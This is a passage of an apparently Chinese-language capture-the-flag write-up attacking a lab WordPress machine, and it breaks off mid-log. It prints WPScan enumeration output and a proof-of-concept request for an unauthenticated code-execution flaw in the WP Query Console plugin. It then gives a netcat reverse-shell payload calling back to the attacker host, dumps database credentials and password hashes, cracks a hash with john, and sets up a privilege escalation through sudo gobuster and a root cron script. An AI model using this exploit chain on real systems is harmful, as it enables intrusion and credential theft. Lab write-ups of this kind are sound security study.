class="line"></span><br><span class="line">[<span class="operator">+</span>] WordPress version <span class="number">6.7</span>.<span class="number">1</span> identified (Latest, released on <span class="number">202</span>4-<span class="number">1</span>1-<span class="number">21</span>).</span><br><span class="line"> | Found <span class="params">By:</span> Meta Generator (Passive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>, <span class="params">Match:</span> &#x27;WordPress <span class="number">6.7</span>.<span class="number">1</span>&#x27;</span><br><span class="line"> | Confirmed <span class="params">By:</span> Rss Generator (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>feed<span class="operator">/</span>, <span class="symbol">&lt;generator&gt;</span>https:<span class="operator">//</span>wordpress.org<span class="operator">/</span><span class="operator">?</span>v<span class="operator">=</span><span class="number">6.7</span>.<span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>generator<span class="operator">&gt;</span></span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>comments<span class="operator">/</span>feed<span class="operator">/</span>, <span class="symbol">&lt;generator&gt;</span>https:<span class="operator">//</span>wordpress.org<span class="operator">/</span><span class="operator">?</span>v<span class="operator">=</span><span class="number">6.7</span>.<span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>generator<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations <span class="operator">-</span> <span class="params">Time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">02</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">108898</span> <span class="symbol">/</span> <span class="number">108898</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">02</span></span><br><span class="line">[<span class="operator">+</span>] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] akismet</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="symbol">/</span></span><br><span class="line"> | Last <span class="params">Updated:</span> <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">04</span>T21:<span class="number">01</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="params">Readme:</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | [<span class="operator">!</span>] The version is out of date, the latest version is <span class="number">5.3</span>.<span class="number">6</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="operator">/</span>, <span class="params">status:</span> <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | <span class="params">Version:</span> <span class="number">5.3</span>.<span class="number">5</span> (<span class="number">100</span>% confidence)</span><br><span class="line"> | Found <span class="params">By:</span> Readme <span class="operator">-</span> Stable Tag (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | Confirmed <span class="params">By:</span> Readme <span class="operator">-</span> ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] feed</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>feed<span class="symbol">/</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>feed<span class="operator">/</span>, <span class="params">status:</span> <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] wp-query-console</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>wp-query-console<span class="symbol">/</span></span><br><span class="line"> | Latest <span class="params">Version:</span> <span class="number">1.0</span> (up to date)</span><br><span class="line"> | Last <span class="params">Updated:</span> <span class="number">201</span>8-<span class="number">0</span>3-<span class="number">16</span>T16:<span class="number">03</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="params">Readme:</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/wp-query-console/README.txt</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>wp-query-console<span class="operator">/</span>, <span class="params">status:</span> <span class="number">403</span></span><br><span class="line"> |</span><br><span class="line"> | [<span class="operator">!</span>] <span class="number">1</span> vulnerability <span class="params">identified:</span></span><br><span class="line"> |</span><br><span class="line"> | [<span class="operator">!</span>] <span class="params">Title:</span> WP Query Console <span class="operator">&lt;=</span> <span class="number">1.0</span> <span class="operator">-</span> Unauthenticated Remote Code Execution</span><br><span class="line"> |     <span class="params">References:</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="symbol">//wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="operator">//</span>cve.mitre.org<span class="operator">/</span>cgi-bin<span class="operator">/</span>cvename.cgi<span class="operator">?</span>name<span class="operator">=</span>CVE-<span class="number">202</span>4-<span class="number">50498</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="symbol">//www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3</span></span><br><span class="line"> |</span><br><span class="line"> | <span class="params">Version:</span> <span class="number">1.0</span> (<span class="number">80</span>% confidence)</span><br><span class="line"> | Found <span class="params">By:</span> Readme <span class="operator">-</span> Stable Tag (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/wp-query-console/README.txt</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs <span class="operator">-</span> <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">10</span> <span class="symbol">/</span> <span class="number">10</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span></span><br><span class="line"></span><br><span class="line">[i] User(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] ta0</span><br><span class="line"> | Found <span class="params">By:</span> Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-json<span class="operator">/</span>wp<span class="operator">/</span>v2<span class="operator">/</span>users<span class="operator">/</span><span class="operator">?</span>per_page<span class="operator">=</span><span class="number">100</span>&amp;page<span class="operator">=</span><span class="number">1</span></span><br><span class="line"> | Confirmed <span class="params">By:</span></span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] welcome</span><br><span class="line"> | Found <span class="params">By:</span> Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span> Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WPScan DB API OK</span><br><span class="line"> | <span class="params">Plan:</span> free</span><br><span class="line"> | Requests Done (during the scan): <span class="number">3</span></span><br><span class="line"> | Requests <span class="params">Remaining:</span> <span class="number">21</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Finished:</span> Wed Feb  <span class="number">5</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">51</span> <span class="number">2025</span></span><br><span class="line">[<span class="operator">+</span>] Requests <span class="params">Done:</span> <span class="number">108944</span></span><br><span class="line">[<span class="operator">+</span>] Cached <span class="params">Requests:</span> <span class="number">43</span></span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Sent:</span> <span class="number">29.459</span> MB</span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Received:</span> <span class="number">33.016</span> MB</span><br><span class="line">[<span class="operator">+</span>] Memory <span class="params">used:</span> <span class="number">423.633</span> MB</span><br><span class="line">[<span class="operator">+</span>] Elapsed <span class="params">time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">16</span></span><br></pre></td></tr></table></figure></div>
<p>è¶³è¶³æ‰«äº†ä¸€ä¸ªå¤šå°æ—¶å•Š  å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªç”¨æˆ· tao0å’Œwelcome<br>æ’ä»¶ä¹Ÿæ‰«å‡ºæ¥ä¸‰ä¸ªå¯ä»¥åˆ©ç”¨çš„æ˜¯wp-query-console<br>æœç´¢ä¸€ä¸‹è¿™ä¸ªæ’ä»¶,æ‰¾åˆ°poc</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-json/wqc/v1/query</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>kubernetes.docker.internal</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>45</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://kubernetes.docker.internal</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;queryArgs&quot;</span><span class="punctuation">:</span><span class="string">&quot;phpinfo();&quot;</span><span class="punctuation">,</span><span class="attr">&quot;queryType&quot;</span><span class="punctuation">:</span><span class="string">&quot;post&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure></div>
<p>æŠŠhostæ”¹ä¸€ä¸‹å°±å¯ä»¥ç›´æ¥ä½¿ç”¨,<br><img src="https://pic1.imgdb.cn/item/67a342b0d0e0a243d4fbf73d.png"><br>å¯ä»¥çœ‹åˆ°banäº†ä¸€äº›å‡½æ•° ä½†æ˜¯æ²¡æœ‰ban shell_exec<br>pingæœ¬æœº,ç„¶ååœ¨æœ¬æœºæµ‹è¯•æ˜¯å¦shell_execå¯ä»¥åˆ©ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# tcpdump icmp </span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">17:25:17.256362 IP 192.168.240.231 &gt; 192.168.240.83: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">17:25:17.256445 IP 192.168.240.83 &gt; 192.168.240.231: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">17:25:18.261902 IP 192.168.240.231 &gt; 192.168.240.83: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">17:25:18.261977 IP 192.168.240.83 &gt; 192.168.240.231: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 2, length 64</span><br></pre></td></tr></table></figure></div>
<p>åå¼¹shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">&quot;<span class="built_in">shell_exec</span>(&#x27;nc -e /bin/bash <span class="number">192.168</span>.<span class="number">240.83</span> <span class="number">1234</span>&#x27;);&quot;</span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°shell</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æ‹¿åˆ°shellä¹‹åçœ‹wordpressçš„é…ç½®æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@listen</span><span class="symbol">:~/html/wordpress</span><span class="variable">$ </span>cat wp-config.php</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LASSO"><figure class="iseeu highlight /lasso"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ** Database settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database username */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;ll104567&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database password */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;thehandsomeguy&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database hostname */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database charset to use in creating database tables. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The database collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br></pre></td></tr></table></figure></div>

<p>å‘ç°æ•°æ®åº“æ³„éœ² </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress]&gt; select <span class="symbol">*</span> from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string"> ID </span>|<span class="string"> user_login </span>|<span class="string"> user_pass                          </span>|<span class="string"> user_nicename </span>|<span class="string"> user_email        </span>|<span class="string"> user_url              </span>|<span class="string"> user_registered     </span>|<span class="string"> user_activation_key                           </span>|<span class="string"> user_status </span>|<span class="string"> display_name </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string">  1 </span>|<span class="string"> ta0        </span>|<span class="string"> $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. </span>|<span class="string"> ta0           </span>|<span class="string"> 2814928906@qq.com </span>|<span class="string"> http://192.168.31.181 </span>|<span class="string"> 2025-01-08 03:10:43 </span>|<span class="string">                                               </span>|<span class="string">           0 </span>|<span class="string"> ta0          </span>|</span><br><span class="line">|<span class="string">  2 </span>|<span class="string"> welcome    </span>|<span class="string"> $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ </span>|<span class="string"> welcome       </span>|<span class="string"> 127.0.0.1@qq.com  </span>|<span class="string">                       </span>|<span class="string"> 2025-01-08 04:29:28 </span>|<span class="string"> 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. </span>|<span class="string">           0 </span>|<span class="string"> welcome      </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">2 rows in set (0.014 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wordpress]&gt; </span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·åå’Œå¯†ç ,ç„¶åç”¨johnå¯ä»¥è·‘å‡ºæ¥welcomeçš„å¯†ç ,æ¥ä¸‹æ¥å°±åˆ‡æ¢åˆ°welcomeç”¨æˆ·æ“ä½œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># john tmp                                                                             </span></span><br><span class="line">Using default input <span class="params">encoding:</span> UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password hash (phpass [phpass ($P$ <span class="keyword">or</span> $H$) <span class="number">128</span><span class="symbol">/128</span> ASIMD <span class="number">4</span>x2])</span><br><span class="line">Cost <span class="number">1</span> (iteration count) is <span class="number">8192</span> for all loaded hashes</span><br><span class="line">Will run <span class="number">2</span> OpenMP threads</span><br><span class="line">Proceeding <span class="keyword">with</span> single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; <span class="keyword">or</span> Ctrl-C to <span class="built_in">abort</span>, almost any other key for status</span><br><span class="line">Almost <span class="params">done:</span> Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding <span class="keyword">with</span> wordlist:<span class="symbol">/usr/share/john/password.lst</span></span><br><span class="line">Proceeding <span class="keyword">with</span> incremental:ASCII</span><br><span class="line"><span class="number">104567</span>           (<span class="operator">?</span>)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">22</span> DONE <span class="number">3</span><span class="symbol">/3</span> (<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">18</span>:<span class="number">05</span>) <span class="number">0.04403</span>g<span class="symbol">/s</span> <span class="number">8169</span>p<span class="symbol">/s</span> <span class="number">8169</span>c<span class="symbol">/s</span> <span class="number">8169</span>C<span class="symbol">/s</span> milling1..<span class="number">192011</span></span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸€ä¸ªgobusterçš„sudoæƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> welcome on <span class="symbol">listen:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> welcome may run the following commands on <span class="symbol">listen:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/gobuster</span><br></pre></td></tr></table></figure></div>
<p>ç°åœ¨éœ€è¦æˆ‘ä»¬ç”¨ä¸€ä¸ªpspy64ç¨‹åºçœ‹å®šæ—¶ä»»åŠ¡ ä¸‹è½½åœ°å€åœ¨<br><code>https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">welcome@listen:~$ wget <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line"><span class="operator">-</span>-<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">1</span>5--  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="params">Length:</span> <span class="number">3104768</span> (<span class="number">3.0</span>M) [application<span class="operator">/</span>octet-stream]</span><br><span class="line">Saving <span class="params">to:</span> â€˜pspy64â€™</span><br><span class="line"></span><br><span class="line">pspy64                       <span class="number">100</span>%[<span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span><span class="operator">&gt;</span>]   <span class="number">2.96</span>M  <span class="operator">-</span>-.-KB<span class="symbol">/s</span>    <span class="keyword">in</span> <span class="number">0.1</span>s    </span><br><span class="line"></span><br><span class="line"><span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">15</span> (<span class="number">30.4</span> MB<span class="operator">/</span>s) <span class="operator">-</span> â€˜pspy64â€™ saved [<span class="number">3104768</span><span class="operator">/</span><span class="number">3104768</span>]</span><br><span class="line"></span><br><span class="line">welcome@listen:~$ chmod <span class="number">777</span> pspy64</span><br><span class="line">welcome@listen:~$ <span class="symbol">./pspy64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2047</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2048</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2049</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2050</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2051</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2052</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br></pre></td></tr></table></figure></div>
<p>çœ‹åˆ°rootä¼šå®šæ—¶å†™å…¥&#x2F;opt&#x2F;.test.sh<br>æ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨.test.shä¸­å†™å…¥æ–‡ä»¶ ï¼ˆåå¼¹shellï¼‰<br>å¤§ä½¬ä»¬çš„æ€è·¯å¤ªnbäº†,å°±æ˜¯åˆ©ç”¨gobusterè¾“å‡ºç»“æœçš„å›æ˜¾æ¥å†™å…¥å‘½ä»¤<br>å…·ä½“æ˜¯è¿™æ ·çš„: åœ¨æœ¬æœºå¼€httpæœåŠ¡,åˆ›å»ºæ–‡ä»¶å¤¹ï¼Œåœ¨é¶æœºç”¨gobusterè‡ªå·±åˆ›ä¸€ä¸ªå­—å…¸ï¼ŒæŒ‡å‘æˆ‘ä»¬åœ¨æœ¬æœºçš„æ–‡ä»¶å¤¹ï¼Œè¿™æ ·å°±ä¼šæ˜¾ç¤ºé¶æœºä¸­å­—å…¸æ–‡ä»¶ä¸­çš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"> â”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# touch a</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> / HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /f7c3be62-4f83-404f-9236-89f88603c3f8 